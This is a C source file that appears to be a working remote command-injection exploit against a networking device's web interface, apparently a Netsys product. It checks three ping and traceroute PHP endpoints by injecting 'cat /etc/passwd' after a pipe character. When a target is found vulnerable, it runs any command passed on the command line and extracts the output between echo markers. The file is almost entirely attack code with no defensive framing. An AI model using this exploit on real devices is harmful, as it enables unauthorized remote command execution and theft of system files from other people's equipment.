// "Multiple Netsys

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <regex.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 9090

// Function to create an HTTP GET request
void create_http_get_request(const char *target_ip, const char *path, char *request, size_t request_size) {
    snprintf(request, request_size,
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, target_ip);
}

// Function to send an HTTP GET request and receive the response
int send_http_get_request(const char *target_ip, const char *path, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP GET request
    create_http_get_request(target_ip, path, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, response_size);
    bytes_received = recv(sock, response, response_size - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    const char *injections[] = {
        "/view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|cat+/etc/passwd;",
        "/view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|cat+/etc/passwd;",
        "/view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1|cat+/etc/passwd;"
    };
    char response[MAX_RESPONSE_SIZE];

    for (int i = 0; i < sizeof(injections) / sizeof(injections[0]); i++) {
        char path[512];
        snprintf(path, sizeof(path), injections[i]);
        
        if (send_http_get_request(target_ip, path, response, sizeof(response)) > 0) {
            if (strstr(response, "root:") != NULL) { // Check for presence of "/etc/passwd"
                return 1; // Target is vulnerable
            }
        }
    }
    return 0; // Target is not vulnerable
}

// Function to execute a command
void execute_command(const char *target_ip, const char *cmd) {
    char marker[16];
    snprintf(marker, sizeof(marker), "MARKER_%d", rand() % 10000); // Generate a random marker
    char encoded_cmd[256];
    snprintf(encoded_cmd, sizeof(encoded_cmd), "echo+%s; %s; echo+%s;", marker, cmd, marker);

    const char *injections[] = {
        "/view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|%s",
        "/view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|%s",
        "/view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1|%s"
    };

 char response[MAX_RESPONSE_SIZE];

    for (int i = 0; i < sizeof(injections) / sizeof(injections[0]); i++) {
        char path[512];
        snprintf(path, sizeof(path), injections[i], encoded_cmd);
        
        if (send_http_get_request(target_ip, path, response, sizeof(response)) > 0) {
            // Check for the output between the markers
            char *start = strstr(response, marker);
            char *end = strstr(start + strlen(marker), marker);
            if (start && end) {
                start += strlen(marker);
                *end = '\0'; // Null-terminate the output
                printf("Command output: %s\n", start);
                return;
            }
        }
    }
    printf("No output received for the command.\n");
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)){
        execute_command(target_ip, cmd);
    }

    return EXIT_SUCCESS;
}
